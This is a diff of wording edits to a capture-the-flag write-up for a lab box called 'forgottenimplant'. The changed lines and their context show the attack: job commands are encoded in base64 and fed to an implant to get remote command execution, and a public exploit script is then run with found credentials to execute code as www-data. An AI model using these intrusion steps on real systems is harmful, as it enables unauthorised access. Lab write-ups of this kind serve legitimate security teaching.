@@ -46,7 +46,7 @@ Accept: */*
 Connection: keep-alive
 ```
 
-We're receiving an HTTP GET call to a `heartbeat` endponit and a long filename that looks like base 64. Decoding it we find a status message as below. 
+We're receiving an HTTP GET call to a `heartbeat` endpoint and a long filename that looks like base 64. Decoding it we find a status message as below. 
 
 ```json
 {
@@ -83,7 +83,7 @@ Soon after starting the server we see calls coming in for the  `heartbeat` endpo
 
 ## Foothold
 
-To begin interacting with the endponit, we'll host a file at `/get-job/ImxhdGVzdCI=` for the implant to pull. We'll seed it with a `ls` command to start.
+To begin interacting with the box, we'll host a file at `/get-job/ImxhdGVzdCI=` for the implant to pull. We'll seed it with a `ls` command to start.
 
 ```bash
 ┌──(user㉿kali-linux-2022-2)-[~]
@@ -103,7 +103,7 @@ Decoding the base 64 we see
 {"success": false, "result": "Encoding error"}
 ```
 
-OK, so it wants base 64. On the next round we'll encode the payload:
+OK, so it wants the payload back in base 64 as well. On the next round we'll encode the payload:
 
 `echo 'ls' | base64 > get-job/ImxhdGVzdCI=`
 
@@ -119,13 +119,13 @@ We submit:
 
 `echo '{"job_id": 0, "cmd": "ls"}' | base64 > get-job/ImxhdGVzdCI=`
 
-With this we get back:
+We receive:
 
 ```json
 {"job_id": 0, "cmd": "ls", "success": true, "result": "products.py\nuser.txt\n"}
 ```
 
-We've achieved RCE and found the first flag already, let's grab it right now!
+*We've achieved RCE and found the first flag already, let's grab it right now!*
 
 Send:
 
@@ -360,7 +360,7 @@ Shellcodes: No Results
 └─$              
 ```
 
-We upload the exploit file and run it with the credentials that we found in ada's python file earlier. 
+Because this port isn't exposed externally, we'll have to either set up a reverse tunnel or attack locally on the box. For simplicity, we upload the exploit file and run it against localhost with the credentials that we found in ada's python file earlier. 
 ```bash
 ada@forgottenimplant:~$ python3 ./50457.py 127.0.0.1 80 / app [redacted] id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -401,7 +401,9 @@ drwxr-xr-x 25 www-data www-data   4096 Jul 12  2022 vendor
 ada@forgottenimplant:/var/www/phpmyadmin$
 ```
 
-We'll create a file and try to call it through `curl` as a quick test to prove that the folder is accessable:
+If we can access this through the web server we'll be able to run code as www-data. 
+
+Lets create a file and try to call it through `curl` as a quick test to prove that the folder is accessable:
 
 ```bash
 ada@forgottenimplant:/var/www/phpmyadmin$ echo "hello" > tmp/hi.html
